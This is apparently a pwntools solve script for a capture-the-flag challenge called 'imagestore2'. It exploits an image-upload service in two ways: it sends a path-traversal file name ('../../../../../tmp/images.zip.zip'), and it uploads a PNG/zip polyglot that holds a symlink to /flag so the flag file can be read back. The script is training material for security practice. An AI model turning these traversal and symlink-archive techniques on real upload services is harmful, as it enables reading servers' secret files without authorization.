from pwn import *
import os 
import subprocess

HOST = os.environ.get("HOST", "imagestore2.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 15113))

conn = remote(HOST, PORT)

conn.recvuntil(b'> ')
conn.send(b'1\n')
print("ok")

payload = b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQIW2P4v5ThPwAG7wKklwQ/bwAAAABJRU5ErkJgglBLAwQKAAAAAAA4iylVTnsDdQUAAAAFAAAAFAAcAHN5bWxpbmtfdG9fZmxhZy5saW5rVVQJAAP8WhtjBVsbY3V4CwABBOgDAAAE6AMAAC9mbGFnUEsBAh4DCgAAAAAAOIspVU57A3UFAAAABQAAABQAGAAAAAAAAAAAAP+hAAAAAHN5bWxpbmtfdG9fZmxhZy5saW5rVVQFAAP8WhtjdXgLAAEE6AMAAAToAwAAUEsFBgAAAAABAAEAWgAAAFMAAAAAAA=="

conn.recvuntil(b': ')
conn.send(b'../../../../../tmp/images.zip.zip\n')

conn.recvuntil(b': ')
conn.send(payload+b'\n')


conn.recvuntil(b'> ')
conn.send(b'4\n')

SMALL_ZIP = b'PK\x05\x06' + 18 * b'\x00'

false_zip = b64e(SMALL_ZIP + 100000 * b'A').encode()

conn.recvuntil(b': ')
conn.send(false_zip+b'\n')


conn.recvuntil(b'> ')
conn.send(b'2\n')
conn.recvuntil(b'> ')
conn.send(b'0\n') # flag
conn.recvuntil(b'\n')

flag = b64d(conn.recvuntil(b'\n')).decode()

conn.close()

print(flag)





